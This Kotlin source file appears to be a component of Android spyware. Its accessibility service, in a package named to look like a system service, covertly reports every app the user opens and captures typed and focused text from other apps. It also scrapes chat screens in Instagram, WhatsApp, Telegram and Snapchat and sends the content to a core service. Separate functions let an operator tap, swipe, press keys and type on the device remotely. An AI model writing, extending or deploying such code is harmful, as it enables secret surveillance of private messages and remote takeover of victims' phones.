package com.system.service.monitors

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.system.service.core.CoreService
import org.json.JSONObject

class AccessibilityMonitor : AccessibilityService() {

    companion object {
        var instance: AccessibilityMonitor? = null
        fun performTouch(x: Float, y: Float)  { instance?.doTouch(x, y) }
        fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, dur: Long = 300) {
            instance?.doSwipe(x1, y1, x2, y2, dur)
        }
        fun performBack()    { instance?.performGlobalAction(GLOBAL_ACTION_BACK) }
        fun performHome()    { instance?.performGlobalAction(GLOBAL_ACTION_HOME) }
        fun performRecents() { instance?.performGlobalAction(GLOBAL_ACTION_RECENTS) }
        fun typeText(text: String) { instance?.doType(text) }
    }

    private var lastPkg = ""
    private var lastScreenText = ""

    override fun onServiceConnected() { super.onServiceConnected(); instance = this }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val svc = CoreService.instance ?: return
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (pkg != lastPkg) {
                        lastPkg = pkg
                        svc.sendData("app_open", JSONObject().apply {
                            put("package", pkg)
                            put("class", event.className ?: "")
                            put("time", System.currentTimeMillis())
                        })
                    }
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val text = event.text.joinToString(" ")
                    if (text.isNotBlank()) {
                        svc.sendData("screen_text", JSONObject().apply {
                            put("package", pkg); put("text", text)
                            put("time", System.currentTimeMillis())
                        })
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    if (pkg.contains("instagram") || pkg.contains("whatsapp")
                        || pkg.contains("telegram") || pkg.contains("snapchat")) {
                        val root = rootInActiveWindow ?: return
                        val content = extractText(root)
                        if (content != lastScreenText && content.isNotBlank()) {
                            lastScreenText = content
                            svc.sendData("chat_content", JSONObject().apply {
                                put("package", pkg); put("content", content)
                                put("time", System.currentTimeMillis())
                            })
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractText(node: AccessibilityNodeInfo?, depth: Int = 0): String {
        if (node == null || depth > 8) return ""
        val sb = StringBuilder()
        node.text?.let { if (it.isNotBlank()) sb.append(it).append("\n") }
        node.contentDescription?.let { if (it.isNotBlank()) sb.append("[").append(it).append("]\n") }
        for (i in 0 until node.childCount) sb.append(extractText(node.getChild(i), depth + 1))
        return sb.toString().trim()
    }

    // ── Remote control ──────────────────────────────────────────────────────
    private fun doTouch(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50)).build(), null, null)
    }

    private fun doSwipe(x1: Float, y1: Float, x2: Float, y2: Float, dur: Long) {
        val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur)).build(), null, null)
    }

    private fun doType(text: String) {
        try {
            val root = rootInActiveWindow ?: return
            val node = findFirstEditable(root) ?: return
            val args = Bundle().apply {
                putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        } catch (_: Exception) {}
    }

    private fun findFirstEditable(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 10) return null
        if (node.isEditable) return node
        for (i in 0 until node.childCount) {
            findFirstEditable(node.getChild(i), depth + 1)?.let { return it }
        }
        return null
    }

    override fun onInterrupt() {}
    override fun onDestroy() { instance = null; super.onDestroy() }
}
